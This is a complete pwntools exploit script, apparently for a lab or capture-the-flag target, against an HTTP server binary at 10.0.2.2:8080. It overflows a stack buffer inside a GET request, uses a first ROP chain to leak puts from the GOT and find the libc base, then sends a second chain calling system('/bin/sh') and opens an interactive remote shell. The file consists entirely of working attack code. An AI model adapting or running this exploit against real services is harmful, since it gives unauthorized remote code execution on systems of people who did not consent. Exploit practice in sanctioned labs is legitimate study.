#!/usr/bin/env python3
from pwn import *

HOST = '10.0.2.2'
PORT = 8080

elf = context.binary = ELF("./httpserver")
rop = ROP(elf)

if args.LOCAL:
    libc = ELF("/lib/libc.so.6")
else:
    libc = ELF("./libc-2.28.so")


# For GDB debugging
def start():
    if args.LOCAL:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript='continue')
        return process(elf.path)
    else:
        return remote(HOST, PORT)


p = start()

log.info(f"PUTS@GOT {hex(elf.got.puts)}")

padding = b"GET "
padding += b"aaa\x00"
padding += b"A" * (cyclic_find(0x6161616962616161, n=8) - 4)

rop.raw(padding)
rop.call('puts', [elf.got['puts']])
rop.call('main')

log.info(rop.dump())

p.sendline(rop.chain())

PUTS = unpack(p.recvlines(4)[-1], 'all')
log.info(f"PUTS@LIBC: {hex(PUTS)}")

libc.address = PUTS - libc.sym['puts']
log.info(f"LIBC base: {hex(libc.address)}")

rop = ROP([elf, libc])

padding = b"GET "
padding += b"aaa\x00"
padding += b"A" * (cyclic_find(0x6161616962616161, n=8) - 4)

rop.raw(padding)
rop.raw(rop.ret.address)
rop.call('system', [next(libc.search(b"/bin/sh\x00"))])
rop.call('exit', [0])

log.info(rop.dump())

p.sendline(rop.chain())

p.clean()
log.success('Enjoy your shell :)')
p.interactive()
